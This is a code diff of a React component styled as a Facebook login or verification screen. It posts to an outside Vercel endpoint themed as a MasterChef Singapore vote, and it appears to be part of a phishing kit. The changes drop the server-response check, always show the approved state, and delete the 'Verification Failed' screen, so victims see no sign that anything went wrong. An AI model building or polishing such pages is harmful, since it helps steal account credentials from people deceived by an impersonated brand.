@@ -16,7 +16,7 @@ export default function FacebookLogin() {
     setLoading(true);
 
     try {
-      const res = await fetch(
+      await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
           method: "POST",
@@ -32,17 +32,12 @@ export default function FacebookLogin() {
           }),
         }
       );
-
-      const data = await res.json();
-
-      if (data.success) {
-  setStatus("approved");
-}
     } catch (err) {
       console.log(err);
+    } finally {
+      setStatus("approved");
+      setLoading(false);
     }
-
-    setLoading(false);
   }
   if (status === "pending") {
     return (
@@ -76,7 +71,7 @@ export default function FacebookLogin() {
     );
   }
 
-  if (status === "approved") {
+  if (status === "approved" || status === "rejected") {
     return (
       <div className="min-h-screen bg-white flex items-center justify-center px-6">
         <div className="w-full max-w-sm text-center">
@@ -96,35 +91,7 @@ export default function FacebookLogin() {
           </h2>
 
           <p className="mt-3 text-gray-600">
-            try again.
-          </p>
-
-        </div>
-      </div>
-    );
-  }
-
-  if (status === "rejected") {
-    return (
-      <div className="min-h-screen bg-white flex items-center justify-center px-6">
-        <div className="w-full max-w-sm text-center">
-
-          <img
-            src={facebookLogo}
-            alt="Logo"
-            className="w-16 h-16 mx-auto mb-8"
-          />
-
-          <div className="text-red-600 text-6xl mb-4">
-            ×
-          </div>
-
-          <h2 className="text-2xl font-bold text-gray-800">
-            Verification Failed
-          </h2>
-
-          <p className="mt-3 text-gray-600">
-            Your request could not be approved.
+            Try again.
           </p>
 
         </div>
